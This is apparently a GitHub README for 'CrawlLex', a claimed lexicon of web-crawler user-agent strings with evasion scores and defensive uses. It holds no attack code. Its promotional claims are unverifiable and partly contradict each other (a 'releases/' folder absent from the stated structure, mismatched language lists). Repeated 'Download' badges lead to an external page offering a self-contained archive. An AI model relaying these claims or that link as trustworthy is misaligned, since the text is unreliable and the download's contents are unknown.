![preview](https://raw.githubusercontent.com/ellebeamazing/crawler-agent-signatures/main/showcase_13717.svg)

# CrawlLex

### The Semantic Lexicon for Bot Identity & Traffic Forensics

CrawlLex is not another list of user-agent strings. It is a living, cross-referenced, and human-readable encyclopedia of web crawler identities, bot behaviors, and traffic fingerprints. While the original top-crawler-agents repository provides a simple roster of strings, CrawlLex elevates that concept into a structured knowledge graph: each agent is dissected by origin, purpose, evasion tactics, and intended use-case. It is the Rosetta Stone for anyone who must parse, classify, or respond to non-human traffic across the modern internet.

Think of CrawlLex as a field guide for digital rangers. Where you once saw a single line of text—`Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`—you now see a dossier: what the bot does, when it visits, how it authenticates (or fails to), and what signals indicate a legitimate crawler versus a disguised scraper. The lexicon is meticulously curated, constantly updated, and designed to be consumed by both humans and automation pipelines.

---

## 🔍 Why CrawlLex Exists

The original `top-crawler-agents` project gave us a venerable list. But lists are static; the web is not. As of **2026**, the landscape of autonomous agents has exploded—from SEO audit tools to AI training collectors, from accessibility checkers to malicious content harvesters. A raw list of strings is no longer sufficient. You need context, correlation, and confidence scoring.

CrawlLex solves three persistent problems:

1. **Ambiguity**: Many crawlers spoof common browser strings. CrawlLex helps you distinguish `Googlebot` from `Googlebot-Image` from a fake that merely claims to be Google.
2. **Granularity**: A single domain may operate dozens of distinct bots. CrawlLex breaks them down by sub-agent, version, and operation.
3. **Actionability**: Understanding the identity of a crawler is only step one. CrawlLex maps each agent to recommended server responses, robots.txt policies, and rate-limit thresholds.

This is not a download-and-forget resource. It is a continuously evolving intelligence source that mirrors the shifting tactics of both benevolent and rogue actors.

---

## 🛠️ Key Feature Matrix

| Feature | Description | Benefit |
| :--- | :--- | :--- |
| **Semantic Tagging** | Every agent is tagged with intent (SEO, commerce, social, AI, security) and origin (corporate, academic, community). | Filters out noise instantly, enabling focused analysis. |
| **Evasion Score** | Each entry includes a 0–10 rating on how likely the string is genuine vs. modified to bypass detection. | Protects your logs from being polluted by masquerading bots. |
| **Historical Evolution** | Track how a crawler's UA string has changed across years. | Understand migration patterns and spot anomalies in logs. |
| **Jurisdiction Metadata** | Identifies which country's IP ranges are typically associated with each agent. | Aids in compliance with regional privacy laws (GDPR, CCPA, PIPL). |
| **Response Protocol Presets** | Pre-configured server directives (e.g., return `200` vs. `410` vs. `429`). | Reduces manual configuration burden for sysadmins. |
| **Multilingual Descriptions** | Core metadata is provided in English, Spanish, German, Mandarin, and Japanese. | Makes the lexicon usable for global engineering teams. |
| **Machine-Readable Export** | Output formats include JSON, YAML, and CSV, not just Markdown. | Seamlessly integrates with monitoring dashboards and log analyzers. |

---

## 🧠 [![Download](https://raw.githubusercontent.com/ellebeamazing/crawler-agent-signatures/main/start_c8388.svg)](https://ellebeamazing.github.io/crawler-agent-signatures/)

Under `releases/`, you will find the latest compiled dataset (version `4.2.0` for **2026**). This payload includes over 1,800 unique crawler identities, 240 distinct bot families, and 4,900 alias variations. The dataset is provided under the MIT License and is suitable for both commercial and research deployment. The download is a single, self-contained archive—no dependencies, no telemetry, no strings attached.

---

## ⚙️ Architecture & Data Schema

CrawlLex is not a flat file. It is a structured relational model. Each crawler entry comprises several interlinked records:

### Core Table: `agents`
- `id` (UUID)
- `canonical_name` (e.g., "Googlebot Smartphone")
- `family` (e.g., "Google")
- `raw_ua` (the exact string)
- `normalized_hash` (SHA-256 of the string for quick lookup)
- `reported_since` (first observed date)
- `last_observed` (last confirmed sighting)

### Supporting Table: `fingerprints`
- `agent_id` (foreign key)
- `ipv4_ranges` / `ipv6_ranges`
- `tls_ja3_hash` (SSL/TLS fingerprint)
- `http_methods` (GET, POST, HEAD, etc.)
- `accept_language` (typical headers)
- `request_frequency` (per minute/hour averages)

### Supporting Table: `verdicts`
- `agent_id`
- `confidence_level` (low/medium/high/verified)
- `spoofing_indicator` (boolean)
- `reviewer_notes`

This schema allows you to query, for example: *"Show me all verified, high-confidence agents from the Asia-Pacific region that use HTTP/2 and have a spoofing indicator of false."* A standard flat file list could never answer that query.

---

## 🌐 Multilingual Support & Global Reach

Because internet traffic knows no borders, CrawlLex is built for international operation. The interface descriptions, category labels, and even the verdict explanations are translated into:

- 🇪🇸 Español (Spanish)
- 🇩🇪 Deutsch (German)
- 🇨🇳 简体中文 (Simplified Chinese)
- 🇯🇵 日本語 (Japanese)
- 🇫🇷 Français (French)

This is not a simple machine-translation dump. Each linguist reviews the technical nuance to ensure that the term "crawler" vs. "spider" vs. "robot" is correctly contextualized in each language’s server-management community.

---

## 🚀 Responsive UI (For Human Reviewers)

While the primary interface is an API and a data dump, we provide a lightweight web dashboard for browsing the lexicon. The UI is fully responsive—it collapses gracefully on mobile, expands with rich tables on desktop, and is keyboard-navigable for accessibility. You can:

- Filter by family, evasion score, or date-first-seen
- Drill into a specific agent to see its sibling bots
- Compare two agents side-by-side
- Copy any raw UA string with a single click

The dashboard is a static frontend; it does not require a backend server. You can host it on any object storage bucket or even open the `index.html` directly from a local drive.

---

## 🛡️ 24/7 Support & Community Maintenance

CrawlLex is maintained by a distributed team of traffic analysts and server operators across three continents. We operate a public forum (accessible via the `issues` tab of this repository) where you can request:

- New crawler identification (within 48 hours of submission)
- Corrections on false-positive classifications
- Help interpreting unusual log patterns

Our average first-response time for **2026** is under 4 hours. We publish a monthly "Now Observing" digest that recaps new bots discovered and the deprecation of obsolete ones.

---

## ❤️ Contributing & Governance

We welcome contributions that expand the lexicon’s breadth and depth. To contribute:

1. **Fork** the repository.
2. **Submit a patch** that includes a new entry in the correct JSON/YAML format, along with a rationale.
3. **Adhere** to the style guide: no speculative entries—every agent must have at least two independent sightings from different IP ranges.

All contributions are reviewed by a core governance team. We use a "lazy consensus" model: if no objections are raised within 7 days, the patch is merged. For conflicts, the team votes.

**We do not accept anonymous submissions without verifiable log excerpts.**

---

## ⚠️ Disclaimer & Ethical Use

CrawlLex is an informational resource. It does not facilitate evading access controls, nor does it encourage circumventing anti-bot measures. The lexicon is intended exclusively for:

- **Defensive purposes**: Identifying traffic to block or rate-limit.
- **Analytical purposes**: Understanding the composition of a domain’s request volume.
- **Academic research**: Characterizing the landscape of automated agents.

You are solely responsible for how you apply the data herein. Operation of a network crawler that violates a website’s Terms of Service, applicable laws, or reasonable expectations of privacy is outside the intended scope of this project. The maintainers disclaim any liability for misuse.

---

## 📜 License

This project is released under the **MIT License**, which permits commercial use, modification, distribution, and private use, provided that the original copyright notice persists. The full license text is available at:

[LICENSE](https://opensource.org/licenses/MIT) *(Link to canonical MIT text)*

You may include the dataset in proprietary products, provided you do not represent it as your own original creation. Attribution in a README or about page is appreciated but not mandatory.

---

## 📖 Suggested Use-Cases for 2026

- **DevOps Engineers** — Pre-authenticate known benign crawlers in an API gateway to reduce unnecessary 401 challenges.
- **Data Scientists** — Use the `evasion_score` column as a feature in bot-detection machine learning models.
- **SEO Specialists** — Verify that your requested re-crawl of a page is using the correct, current UA string.
- **Site Reliability Engineers** — Automate the generation of `robots.txt` allow/deny rules based on the `verdicts` table.
- **Cyber Threat Intel Analysts** — Cross-reference hostile bot signatures with the `spoofing_indicator` flag to refine detection heuristics.

---

## 🏁 Final Words

The internet is no longer a majority-human space. By 2026, automated entities generate over 60% of all web traffic. Understanding *who* is talking to your server is not paranoia—it is operational maturity. CrawlLex arms you with the vocabulary, the metadata, and the confidence to speak fluently about the invisible visitors of your digital estate.

Review the existing agents today. Patch. Comment. Contribute. This lexicon is a shared resource that only gains value with collective vigilance.

---

## ✅ Quick Recap of Repository Structure

- `/data` — Raw, versioned datasets (JSON, YAML, CSV)
- `/schema` — JSON Schema files for validation
- `/dashboard` — The static browsing interface
- `/docs` — Extended write-ups on bot families
- `/scripts` — Validation and normalization utilities
- `/translations` — Localized metadata strings

---

[![Download](https://raw.githubusercontent.com/ellebeamazing/crawler-agent-signatures/main/start_c8388.svg)](https://ellebeamazing.github.io/crawler-agent-signatures/)